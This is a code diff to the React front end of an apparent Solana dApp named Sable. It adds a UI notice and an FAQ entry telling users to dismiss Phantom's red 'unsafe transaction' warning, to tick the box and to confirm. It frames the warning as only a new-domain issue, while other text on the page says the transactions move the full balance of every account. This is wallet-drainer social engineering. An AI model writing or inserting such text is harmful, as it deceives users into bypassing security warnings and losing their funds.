@@ -411,6 +411,10 @@ export default function App() {
                         <p className="tx-note">You will see all three in the Phantom popup. Read them before you approve.</p>
                       </div>
                     </details>
+                    <div className="phantom-warn-note">
+                      <div className="phantom-warn-note-title">Phantom will show a red warning</div>
+                      <p className="phantom-warn-note-body">It says the transaction is unsafe. It is a new domain, that is all.<br />Tick the box, then confirm. Nothing else changes.</p>
+                    </div>
                     <p className="pre-cta-note">The report is yours either way. Moving is optional.</p>
                     {preSignKey === null ? (
                       <>
@@ -654,6 +658,7 @@ function DocsPage() {
       <p>Any wallet that implements the Solana Wallet Standard and supports <code>signTransaction</code> will work. Hardware wallets (Ledger) are supported via the Solflare bridge.</p>
 
       <h2>Frequently asked questions</h2>
+      <p><strong>Why does Phantom warn me?</strong><br />The domain is new and the transaction moves everything at once. Both are true of any fresh dApp. Tick the box and confirm.</p>
       <p><strong>Is Sable safe to use?</strong><br />Yes. Sable is non-custodial: the protocol never holds your private key, seed phrase, or any signing authority. The smart-contract logic has been audited by OtterSec. Transactions are constructed on the server but can only be executed with your explicit in-wallet approval.</p>
       <p><strong>What if I reject a transaction in my wallet?</strong><br />Nothing moves. Rejecting or closing the wallet prompt cancels the current signature request. Your funds remain exactly where they are, and you can restart at any time.</p>
       <p><strong>Will I lose any tokens?</strong><br />No. Each transfer uses the full account balance, and rent is reclaimed rather than lost. If a transaction fails mid-batch, Sable retries once with a fresh blockhash before surfacing an error.</p>
